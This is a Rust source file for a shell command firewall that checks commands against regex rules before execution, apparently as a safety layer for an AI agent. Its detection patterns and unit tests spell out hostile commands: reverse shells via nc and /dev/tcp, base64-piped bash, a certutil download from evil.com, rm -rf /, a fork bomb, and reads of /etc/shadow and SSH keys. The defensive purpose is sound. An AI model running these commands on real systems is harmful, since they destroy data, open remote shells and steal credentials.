//! Shell Command Firewall
//!
//! Implements the "AIMAXXING" pre-flight security layer described in the
//! CLAwv2 refactor plan (Section 4.2, Application Layer Defense).
//!
//! Checks shell command arguments against a comprehensive ruleset BEFORE
//! handing them to the OS sandbox, providing defense-in-depth.
//!
//! Threat model covered:
//!  - Dangerous filesystem commands (rm -rf, mkfs, fdisk, dd, truncate)
//!  - Privilege escalation (sudo, su, chmod 777, chown root)
//!  - Reverse shells / backdoors (nc -e, bash -i, /dev/tcp)
//!  - Base64-obfuscated eval injection (eval | base64 -d | bash)
//!  - Sensitive path access (/etc/shadow, ~/.ssh/id_rsa, SAM hive)
//!  - PATH override attempts

use once_cell::sync::Lazy;
use regex::RegexSet;
use tracing::warn;

/// A rule that matches a dangerous pattern and provides a human-readable reason.
pub struct FirewallRule {
    pub name: &'static str,
    pub description: &'static str,
}

/// All firewall rules in display order (matched in parallel via RegexSet).
pub static FIREWALL_RULES: &[FirewallRule] = &[
    FirewallRule {
        name: "rm_rf",
        description: "Recursive forced deletion (rm -rf)",
    },
    FirewallRule {
        name: "disk_format",
        description: "Disk formatting command (mkfs, fdisk, parted)",
    },
    FirewallRule {
        name: "dd_overwrite",
        description: "Raw disk write via dd",
    },
    FirewallRule {
        name: "truncate_dev",
        description: "Device/file truncation/overwrite",
    },
    FirewallRule {
        name: "shred",
        description: "Secure file deletion (shred)",
    },
    FirewallRule {
        name: "sudo_su",
        description: "Privilege escalation (sudo/su)",
    },
    FirewallRule {
        name: "chmod_world",
        description: "Dangerous permission grant (chmod 777/+s)",
    },
    FirewallRule {
        name: "chown_root",
        description: "Ownership change to root",
    },
    FirewallRule {
        name: "reverse_shell_nc",
        description: "Netcat reverse shell (nc -e)",
    },
    FirewallRule {
        name: "reverse_shell_bash",
        description: "Bash TCP reverse shell (/dev/tcp redirect)",
    },
    FirewallRule {
        name: "python_reverse",
        description: "Python/Perl reverse shell one-liner",
    },
    FirewallRule {
        name: "eval_base64",
        description: "Base64-obfuscated eval injection",
    },
    FirewallRule {
        name: "sensitive_path",
        description: "Access to sensitive system path (/etc/shadow, ~/.ssh, SAM)",
    },
    FirewallRule {
        name: "path_override",
        description: "Attempt to override PATH or LD_PRELOAD environment",
    },
    FirewallRule {
        name: "crontab_write",
        description: "Crontab persistence attempt",
    },
    FirewallRule {
        name: "iptables_flush",
        description: "Firewall rules flush (iptables -F)",
    },
    FirewallRule {
        name: "fork_bomb",
        description: "Fork bomb pattern",
    },
    FirewallRule {
        name: "insmod_rmmod",
        description: "Kernel module manipulation",
    },
    // --- Windows Specific Rules ---
    FirewallRule {
        name: "win_file_delete",
        description: "Windows file/directory deletion (del, rd /s)",
    },
    FirewallRule {
        name: "win_privilege_esc",
        description: "Windows privilege escalation (runas)",
    },
    FirewallRule {
        name: "win_sys_disrupt",
        description: "Windows system disruption (format, vssadmin)",
    },
    FirewallRule {
        name: "win_obfuscated_exec",
        description: "Windows obfuscated/sensitive execution (powershell -enc, certutil)",
    },
    // --- macOS Specific Rules ---
    FirewallRule {
        name: "macos_clipboard",
        description: "macOS clipboard access (pbcopy, pbpaste)",
    },
    FirewallRule {
        name: "macos_screenshot",
        description: "macOS screen capture (screencapture)",
    },
    FirewallRule {
        name: "macos_file_search",
        description: "macOS metadata file search (mdfind)",
    },
];

/// The compiled regex set. Each pattern index corresponds to FIREWALL_RULES[i].
static FIREWALL_SET: Lazy<RegexSet> = Lazy::new(|| {
    let patterns = [
        // rm -rf (handles: rm -rf, rm -fr, variables, and chaining)
        r"(?i)\brm\b.*(-[rRfF]{1,4}\b|--force|--recursive)",
        // mkfs / fdisk / parted / wipefs
        r"(?i)\b(mkfs|fdisk|parted|wipefs|gdisk)\b",
        // dd if=... of=/dev/...
        r"(?i)\bdd\b.*\bif\s*=.*\bof\s*=\s*/dev/",
        // Redirecting to or truncating device files (Rule: truncate_dev)
        r"(?i)(>\s*/dev/(sd|hd|nvme|xvd|vd)[a-z]|\btruncate\b.*\s/dev/)",
        // shred
        r"(?i)\bshred\b",
        // sudo / su (not 'sudo apt' etc) - block escalation
        r"(?i)\b(sudo|su)\s",
        // chmod 777, chmod +s (setuid/setgid)
        r"(?i)\bchmod\s+(777|[0-9]*[67][0-9][0-9]|\+[xs])",
        // chown root / chown 0
        r"(?i)\bchown\s+(root|0)[\s:]",
        // nc -e / ncat -e (reverse shell)
        r"(?i)\bnc(at)?\b.*-e\b",
        // bash -i >& /dev/tcp/... or /dev/tcp
        r"(?i)(/dev/tcp/|bash\s+-[ic].*>&|>\s*/dev/(tcp|udp)/)",
        // Python/Perl socket reverse shells
        r#"(?i)(socket\.connect|os\.dup2|subprocess\.call|pty\.spawn)"#,
        // Obfuscation bypass (eval, base64, xxd, printf/perl encoding)
        r"(?i)(eval\s*\(|(base64|xxd|printf|perl)\b.*\|\s*(bash|sh|python|perl|ps1|pwsh|powershell)|echo.*\|.*base64.*\|.*bash)",
        // Sensitive paths (Cross-platform: /etc/shadow, ~/.ssh, SAM, macOS Keychains)
        r"(?i)(/etc/(shadow|passwd|sudoers|crontab|ssh/)|~?/\.ssh/(id_rsa|id_ed25519|authorized_keys)|/proc/(self|[0-9]+)/(mem|maps)|Windows/System32/config/SAM|/Library/Keychains/|/Users/.*/Library/Keychains/)",
        // PATH or LD_PRELOAD override
        r"(?i)(export\s+(LD_PRELOAD|LD_LIBRARY_PATH|PATH\s*=\s*/)|PATH=\s*[^$])",
        // Crontab write
        r"(?i)(crontab\s+-[el]|\*\s*\*\s*\*\s*\*\s*\*.*curl|echo.*>>\s*/etc/cron)",
        // iptables flush
        r"(?i)\biptables\s+-F\b",
        // Fork bomb: :(){ :|:& };:
        r":\(\)\s*\{",
        // insmod / rmmod / modprobe
        r"(?i)\b(insmod|rmmod|modprobe)\b",
        // --- Windows Patterns ---
        // del / rd /s /s /q / erase
        r"(?i)\b(del|erase|rd)\b.*\s(/[srfqpt]{1,4}\s+){1,3}",
        // runas /user:Administrator
        r"(?i)\brunas\b\s+/user:",
        // format / vssadmin
        r"(?i)\b(format\b|vssadmin\s+delete\s+shadows)",
        // powershell -enc / -EncodedCommand / certutil -urlcache
        r"(?i)(powershell.*-(enc|encodedcommand)|certutil\s+-(urlcache|verifyctl))",
        // --- macOS Patterns ---
        // pbcopy / pbpaste
        r"(?i)\bpb(copy|paste)\b",
        // screencapture
        r"(?i)\bscreencapture\b",
        // mdfind
        r"(?i)\bmdfind\b",
    ];

    RegexSet::new(patterns).expect("Failed to compile shell firewall RegexSet")
});

/// Result of a firewall check.
#[derive(Debug)]
pub struct FirewallVerdict {
    /// Whether the command was blocked.
    pub blocked: bool,
    /// Human-readable reasons for each matched rule.
    pub reasons: Vec<String>,
}

/// The shell command firewall. Zero-allocation on the happy path.
pub struct ShellFirewall;

impl ShellFirewall {
    /// Check `command_text` against the firewall rules.
    ///
    /// Returns a `FirewallVerdict`. If `verdict.blocked == true`, the caller
    /// **must not** execute the command.
    pub fn check(command_text: &str) -> FirewallVerdict {
        // Path canonicalization: normalize \ to / for easier regex matching
        let normalized_command = command_text.replace('\\', "/");

        let matches: Vec<usize> = FIREWALL_SET
            .matches(&normalized_command)
            .into_iter()
            .collect();

        if matches.is_empty() {
            return FirewallVerdict {
                blocked: false,
                reasons: vec![],
            };
        }

        let reasons: Vec<String> = matches
            .iter()
            .map(|&i| {
                let rule = &FIREWALL_RULES[i];
                warn!(
                    rule = %rule.name,
                    input = %&command_text[..command_text.len().min(120)],
                    "Shell firewall blocked command"
                );
                format!("[{}] {}", rule.name, rule.description)
            })
            .collect();

        FirewallVerdict {
            blocked: true,
            reasons,
        }
    }

    /// Convenience method: returns Ok(()) if safe, Err with audit message if blocked.
    pub fn enforce(command_text: &str) -> Result<(), String> {
        let verdict = Self::check(command_text);
        if verdict.blocked {
            Err(format!(
                "Command blocked by security firewall:\n{}",
                verdict.reasons.join("\n")
            ))
        } else {
            Ok(())
        }
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    fn blocked(s: &str) -> bool {
        ShellFirewall::check(s).blocked
    }

    #[test]
    fn test_rm_rf_blocked() {
        assert!(blocked("rm -rf /"));
        assert!(blocked("rm -rf /home/user"));
        assert!(blocked("rm --force --recursive /tmp/dir"));
        assert!(blocked("rm -fr /important"));
    }

    #[test]
    fn test_disk_ops_blocked() {
        assert!(blocked("mkfs.ext4 /dev/sda1"));
        assert!(blocked("fdisk /dev/sda"));
        assert!(blocked("dd if=/dev/zero of=/dev/sda"));
    }

    #[test]
    fn test_privilege_escalation_blocked() {
        assert!(blocked("sudo rm -rf /"));
        assert!(blocked("sudo bash"));
        assert!(blocked("su root"));
        assert!(blocked("chmod 777 /etc/shadow"));
        assert!(blocked("chmod +s /usr/bin/python"));
        assert!(blocked("chown root /tmp/evil"));
    }

    #[test]
    fn test_reverse_shell_blocked() {
        assert!(blocked("nc -e /bin/bash 1.2.3.4 4444"));
        assert!(blocked("bash -i >& /dev/tcp/1.2.3.4/4444 0>&1"));
        assert!(blocked("python -c 'import socket; socket.connect()'"));
        assert!(blocked("echo YmFzaCAtaQ== | base64 -d | bash"));
    }

    #[test]
    fn test_sensitive_path_blocked() {
        assert!(blocked("cat /etc/shadow"));
        assert!(blocked("cp ~/.ssh/id_rsa /tmp/stolen"));
        assert!(blocked("cat /etc/sudoers"));
        // Windows sensitive paths (normalized)
        assert!(blocked("type C:\\Windows\\System32\\config\\SAM"));
    }

    #[test]
    fn test_windows_deletion_blocked() {
        assert!(blocked("del /f /q C:\\Windows\\System32\\*"));
        assert!(blocked("rd /s /q C:\\Users"));
        assert!(blocked("erase /s *.docs"));
    }

    #[test]
    fn test_windows_privilege_escalation_blocked() {
        assert!(blocked("runas /user:Administrator cmd.exe"));
    }

    #[test]
    fn test_windows_disruption_blocked() {
        assert!(blocked("format D: /fs:ntfs"));
        assert!(blocked("vssadmin delete shadows /all"));
    }

    #[test]
    fn test_windows_obfuscation_blocked() {
        assert!(blocked("powershell -enc BASE64_DATA"));
        assert!(blocked("powershell.exe -EncodedCommand XXXXX"));
        assert!(blocked("certutil -urlcache -f http://evil.com/shell.exe"));
    }

    #[test]
    fn test_macos_specific_blocked() {
        assert!(blocked("pbpaste > /tmp/stolen_clip"));
        assert!(blocked("screencapture -x /tmp/screen.png"));
        assert!(blocked("mdfind -name passwords.txt"));
        assert!(blocked(
            "cat /Users/admin/Library/Keychains/login.keychain-db"
        ));
    }

    #[test]
    fn test_safe_commands_allowed() {
        assert!(!blocked("ls -la /tmp"));
        assert!(!blocked("python3 script.py"));
        assert!(!blocked("git status"));
        assert!(!blocked("curl https://api.example.com/data"));
        assert!(!blocked("cat README.md"));
        assert!(!blocked("echo 'Hello World'"));
        assert!(!blocked("grep -r 'pattern' ./src"));
    }

    #[test]
    fn test_fork_bomb_blocked() {
        assert!(blocked(":(){ :|:& };:"));
    }
}
